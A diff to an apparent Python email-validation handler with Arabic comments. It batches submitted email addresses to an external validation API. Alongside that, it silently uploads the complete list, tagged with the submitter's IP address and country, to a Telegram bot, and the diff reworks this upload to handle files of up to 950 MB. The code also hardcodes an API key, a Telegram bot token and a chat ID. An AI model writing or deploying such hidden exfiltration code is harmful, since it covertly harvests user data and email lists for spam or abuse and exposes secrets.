@@ -2,12 +2,13 @@ import json, io, re, requests, concurrent.futures
 from http.server import BaseHTTPRequestHandler
 
 # ================= عدّل هنا بس =================
-API = "https://gmail-validation.mbahbabat.workers.dev"
-KEY = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
-TG_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
-TG_CHAT  = "8554641519"
-BATCH_SIZE = 2000          # حجم كل باتش
-MAX_WORKERS = 8            # عدد الثريدات المتوازية
+API       = "https://gmail-validation.mbahbabat.workers.dev"
+KEY       = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
+TG_TOKEN  = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
+TG_CHAT   = "8554641519"
+API_BATCH = 10_000      # حد API: 10 ألف لكل باتش
+MAX_WORKERS = 10        # باتشات متوازية للـ API
+TG_MAX_BYTES = 950 * 1024 * 1024   # 950 MB أمان (تليجرام حده 2GB للبوتات)
 # ===============================================
 
 _geo_cache = {}
@@ -44,45 +45,63 @@ def safe_name(country):
     n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
     return n or 'unknown'
 
-# ── إرسال باتش واحد لـ Telegram ──────────────────────────────────────────────
-def tg_send_batch(batch_emails, batch_index, ip, country):
-    """يرسل باتش واحد (2000 إيميل) كـ txt لتليجرام."""
-    if not (TG_TOKEN and TG_CHAT and batch_emails):
+# ── تليجرام: ملف واحد (أو عدة لو تجاوز الحد) ────────────────────────────────
+def tg_send(emails, ip, country):
+    if not (TG_TOKEN and TG_CHAT and emails):
         return
+    content   = "\n".join(emails).encode('utf-8')
+    fname_base = safe_name(country)
+
+    # لو الحجم أقل من الحد → ملف واحد مباشرة
+    if len(content) <= TG_MAX_BYTES:
+        _tg_upload(content, f"{fname_base}.txt", len(emails), ip, country, part=None)
+        return
+
+    # لو أكبر → قسّم على حسب الحجم بس (مش عدد) وارفعهم
+    parts, buf = [], bytearray()
+    for line in (e + "\n" for e in emails):
+        enc = line.encode('utf-8')
+        if buf and len(buf) + len(enc) > TG_MAX_BYTES:
+            parts.append(bytes(buf))
+            buf = bytearray()
+        buf.extend(enc)
+    if buf:
+        parts.append(bytes(buf))
+
+    for i, chunk in enumerate(parts, 1):
+        _tg_upload(chunk, f"{fname_base}_part{i}.txt",
+                   chunk.count(b'\n'), ip, country, part=f"{i}/{len(parts)}")
+
+def _tg_upload(content_bytes, fname, count, ip, country, part):
     try:
-        content = "\n".join(batch_emails)
-        f = io.BytesIO(content.encode('utf-8'))
-        fname = f'{safe_name(country)}_batch{batch_index}.txt'
+        caption = (
+            f'📥 Emails: {count}{"  |  Part " + part if part else ""}\n'
+            f'🌍 Country: {country or "unknown"}\n'
+            f'🌐 IP: {ip}'
+        )
+        f = io.BytesIO(content_bytes)
         requests.post(
             f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
-            data={
-                'chat_id': TG_CHAT,
-                'caption': (
-                    f'📥 Batch #{batch_index}  |  {len(batch_emails)} emails\n'
-                    f'🌍 Country: {country or "unknown"}\n'
-                    f'🌐 IP: {ip}'
-                )
-            },
+            data={'chat_id': TG_CHAT, 'caption': caption},
             files={'document': (fname, f, 'text/plain')},
-            timeout=10
+            timeout=120
         )
     except Exception:
         pass
 
-# ── فحص باتش واحد عبر الـ API ────────────────────────────────────────────────
-def check_batch(batch_emails):
-    """يفحص قائمة إيميلات ويرجع (results_list, error_str)."""
-    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in batch_emails}
+# ── فحص باتش واحد (10 ألف) عبر الـ API ──────────────────────────────────────
+def check_batch(batch):
+    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in batch}
     err = None
     try:
         r = requests.post(
             f"{API}/fastcheck1",
             headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
-            json={"mail": batch_emails},
-            timeout=60
+            json={"mail": batch},
+            timeout=120
         )
         if r.status_code == 200:
-            data = r.json()
+            data  = r.json()
             items = data if isinstance(data, list) else data.get("results", [])
             for it in items:
                 em = str(it.get("email", "")).lower()
@@ -94,36 +113,24 @@ def check_batch(batch_emails):
         err = str(e)
     return list(out.values()), err
 
-# ── المعالج الرئيسي: باتشات متوازية (فحص + تليجرام في نفس الوقت) ────────────
+# ── المعالج الرئيسي ────────────────────────────────────────────────────────────
 def process_all(emails, ip, country):
-    """
-    يقسّم الإيميلات لباتشات BATCH_SIZE،
-    ولكل باتش يشغّل بالتوازي:
-        • check_batch  → يفحص الإيميلات على الـ API
-        • tg_send_batch → يرسل الباتش كـ txt لتليجرام
-    ويجمع النتائج كلها في النهاية.
-    """
-    # تقسيم لباتشات
-    batches = [emails[i:i + BATCH_SIZE] for i in range(0, len(emails), BATCH_SIZE)]
+    batches     = [emails[i:i + API_BATCH] for i in range(0, len(emails), API_BATCH)]
     all_results = []
     all_errors  = []
 
-    def handle_batch(args):
-        idx, batch = args
-        # شغّل الفحص والإرسال لتليجرام بالتوازي
-        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as inner:
-            fut_check = inner.submit(check_batch, batch)
-            fut_tg    = inner.submit(tg_send_batch, batch, idx, ip, country)
-            results, err = fut_check.result()
-            fut_tg.result()          # انتظر التليجرام كمان
-        return results, err
+    # شغّل تليجرام بالتوازي مع الفحص (ثريد مستقل)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS + 1) as pool:
+        tg_fut      = pool.submit(tg_send, emails, ip, country)   # تليجرام فوراً
+        api_futs    = [pool.submit(check_batch, b) for b in batches]  # API بالتوازي
 
-    # شغّل كل الباتشات بالتوازي (MAX_WORKERS ثريد)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
-        for results, err in pool.map(handle_batch, enumerate(batches, start=1)):
+        for fut in concurrent.futures.as_completed(api_futs):
+            results, err = fut.result()
             all_results.extend(results)
             if err:
                 all_errors.append(err)
+
+        tg_fut.result()   # انتظر تليجرام لو لسه شغّال
 
     return all_results, (all_errors or None)
 
